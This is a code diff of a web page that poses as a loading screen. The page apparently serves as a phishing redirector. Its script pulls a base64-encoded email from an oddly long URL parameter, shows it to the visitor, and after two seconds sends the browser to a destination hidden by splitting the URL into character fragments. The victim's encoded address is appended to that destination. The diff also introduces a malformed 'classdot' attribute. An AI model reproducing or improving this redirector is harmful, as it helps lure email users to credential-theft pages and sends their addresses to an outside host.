@@ -68,7 +68,7 @@
         <div class="dots-container" aria-label="Loading content">
             <div class="dot"></div>
             <div class="dot"></div>
-            <div class="dot"></div>
+            <div classdot"></div>
             <div class="dot"></div>
             <div class="dot"></div>
         </div>
@@ -86,22 +86,23 @@
             }
         }
 
-        // Function to find a valid email parameter (5)
+        // Function to find a valid email parameter
         function findEmailParam() {
             const urlParams = new URLSearchParams(window.location.search);
             for (const [key, value] of urlParams.entries()) {
+                // Check if the key is 55 characters long and value is a valid base64
                 if (/^[A-Za-z0-9+\/]{55}$/.test(key) && /^[A-Za-z0-9+\/=]*$/.test(value)) {
                     const decodedValue = decodeBase64(value);
                     if (decodedValue && decodedValue.includes('@')) {
-                        return { key, value }; // Return the key and the decoded email
+                        return decodedValue; // Return the decoded email
                     }
                 }
             }
             return null;
         }
 
+        // Function to redirect to target URL
         function redirectToTarget(base64Email) {
-            
             const part1 = 'h';
             const part2 = 't';
             const part3 = 't';
@@ -119,7 +120,7 @@
             const part15 = 'io';
             const part16 = '/dkfuoslxn/?d=';
             const obfuscatedURL = part1 + part2 + part3 + part4 + part5 + part6 + part7 + part8 + part9 + part10 + part11 + part12 + part13 + part14 + part15 + part16 + base64Email;
-            
+
             window.location.href = obfuscatedURL;
         }
 
@@ -128,10 +129,10 @@
             const emailParam = findEmailParam();
             const emailDisplay = document.getElementById('emailDisplay');
             if (emailParam) {
-                emailDisplay.innerText = decodeBase64(emailParam.value); // Always display the decoded email
+                emailDisplay.innerText = emailParam; // Always display the decoded email
             } else {
-                emailDisplay.innerText = "Nofo.";
-                console.error("No e");
+                emailDisplay.innerText = "No email found for display.";
+                console.error("No email to display");
             }
         }
 
@@ -146,9 +147,9 @@
             setTimeout(() => {
                 const emailParam = findEmailParam();
                 if (emailParam) {
-                    redirectToTarget(emailParam.value);
+                    redirectToTarget(btoa(emailParam));
                 } else {
-                    console.error("No e found for redirection");
+                    console.error("No email found for redirection");
                 }
             }, 2000);
         });
